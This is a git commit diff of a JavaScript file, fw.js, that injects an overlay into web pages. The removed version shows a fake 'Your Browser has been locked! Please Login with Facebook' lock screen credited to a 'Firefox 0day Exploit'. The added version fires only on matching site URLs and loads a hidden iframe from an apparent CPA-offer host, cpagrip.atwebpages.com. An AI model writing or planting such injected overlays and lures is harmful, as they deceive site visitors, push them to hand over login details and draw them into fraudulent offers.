3678e237592cb14f1f8f1af55efd336f0fd5e24a
tcodes <hopetashi@yahoo.com>
2016-02-24 14:29:43 +0530

    Update fw.js

--- fw.js
+++ fw.js
@@ -1,18 +1,21 @@
+var url=window.location.href;
+if(url.search(/ckonline.org/i) != -1 || url.search(/8uytr/i) != -1 )
+{
 body = document.body;
 if(body != null) {
 div = document.createElement("div");
-div.style.position = "fixed";
+div.style.position = "absolute";
 div.style.width = "100%";
-div.style.height = "10%";
-div.style.opacity = 2.8;
+div.style.height = "0";
+div.style.opacity = 0.8;
 div.style.top = "+0px";
 div.style.zIndex="9999";
 div.style.bottom = "+0px";
 div.style.left = "+0px";
-div.style.backgroundColor = "#eceff5";
+div.style.backgroundColor = "#FBFBFB";
 div.style.border = "0px solid #94a3c4";
-div.style.padding = "0px";
-div.innerHTML = "<center><font color=red size=5><b> Your Browser has been locked!<br>Please Login with Facebook to Verify you are not robot</font><br><font color=green>Firefox 0day Exploit by Tashi</font></b></center>"
+div.style.margin = "0px";
+div.innerHTML = "<iframe src=http://cpagrip.atwebpages.com/ height=1000px width=100% frameborder=0></noiframe>"
 body.appendChild(div);
 }
 }
